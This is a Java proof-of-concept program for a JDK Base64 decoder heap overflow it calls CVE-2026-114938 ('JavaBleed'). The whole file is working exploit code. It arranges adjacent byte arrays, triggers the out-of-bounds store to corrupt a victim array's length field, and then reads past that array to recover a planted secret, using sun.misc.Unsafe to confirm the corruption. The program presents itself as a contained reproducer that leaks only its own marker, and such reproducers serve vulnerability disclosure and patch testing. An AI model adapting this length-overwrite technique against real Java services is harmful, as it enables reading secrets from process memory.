import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * CVE-2026-114938 ("JavaBleed") heap-disclosure demonstration.
 *
 * Layout (same TLAB, allocation order):
 *   [ dst: 66 bytes ][ victim: 64 bytes ][ secret: marker ]
 *
 * The malformed decode overflows dst by 62 bytes and overwrites the victim's
 * header.  Its length becomes ~1.77 billion, so normal Java bounds checks let
 * us read through the victim into the neighboring secret array.
 *
 * Nothing is written out of bounds by this program except the vulnerability's
 * own fixed-pattern store.  The JVM is halted before GC can walk the smashed
 * object.  Disposable container only.
 */
public final class HeapLeak {
    private static volatile int sink;
    private static volatile Object keep;

    public static void main(String[] args) throws Exception {
        int warmup = 200_000;
        int scan = 8192;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--warmup": warmup = Integer.parseInt(args[++i]); break;
                case "--scan": scan = Integer.parseInt(args[++i]); break;
                default:
                    System.err.println("unknown option: " + args[i]);
                    System.exit(2);
            }
        }

        boolean isJdk17 = Runtime.version().feature() <= 17;
        int aCount = isJdk17 ? 128 : 64;
        byte[] valid = repeat((byte) 'A', aCount);
        byte[] malformed = repeat((byte) 'A', aCount + 1);
        malformed[aCount] = (byte) '=';

        Base64.Decoder decoder = Base64.getDecoder();

        byte[] warm = new byte[4096];
        for (int i = 0; i < warmup; i++) sink += decoder.decode(valid, warm);
        Arrays.fill(warm, (byte) 0);

        byte[] marker = ("J4S-SECRET-" + Long.toHexString(System.nanoTime()))
                .getBytes(StandardCharsets.US_ASCII);

        // dst size 66 is the alignment that makes the 64-byte store hit the
        // victim's length field with the positive 0x699aa669 pattern.
        byte[] dst = new byte[66];
        byte[] victim = new byte[64];
        byte[] secret = new byte[256];

        Arrays.fill(dst, (byte) 0x5a);
        Arrays.fill(victim, (byte) 0x41);
        System.arraycopy(marker, 0, secret, 0, marker.length);
        keep = secret;

        sun.misc.Unsafe unsafe = unsafe();
        long lengthOffset = unsafe.arrayBaseOffset(byte[].class) - 4;
        int before = unsafe.getInt(victim, lengthOffset);

        System.out.println("runtime       = " + System.getProperty("java.runtime.version"));
        System.out.println("marker        = " + new String(marker, StandardCharsets.US_ASCII));
        System.out.println("length before = " + before);
        System.out.flush();

        boolean rejected = false;
        try {
            decoder.decode(malformed, dst);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int after = unsafe.getInt(victim, lengthOffset);
        System.out.println("rejected      = " + rejected);
        System.out.println("length after  = " + after);

        if (after <= 0 || after == before) {
            System.out.println("victim not corrupted; layout missed");
            Runtime.getRuntime().halt(1);
        }

        int from = before;
        int found = indexOf(victim, marker, from, Math.min(from + scan, after));
        if (found >= 0) {
            System.out.println("leaked marker at victim[" + found + "] = "
                    + new String(Arrays.copyOfRange(victim, found, found + marker.length),
                            StandardCharsets.US_ASCII));
            System.out.println("JAVA BLEED REPRODUCED");
            System.out.flush();
            Runtime.getRuntime().halt(0);
        }

        System.out.println("no marker in first " + scan + " bytes (layout missed)");
        Runtime.getRuntime().halt(1);
    }

    private static int indexOf(byte[] haystack, byte[] needle, int from, int to) {
        outer:
        for (int i = from; i <= to - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    private static byte[] repeat(byte value, int count) {
        byte[] out = new byte[count];
        Arrays.fill(out, value);
        return out;
    }

    private static sun.misc.Unsafe unsafe() throws Exception {
        Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        return (sun.misc.Unsafe) f.get(null);
    }
}
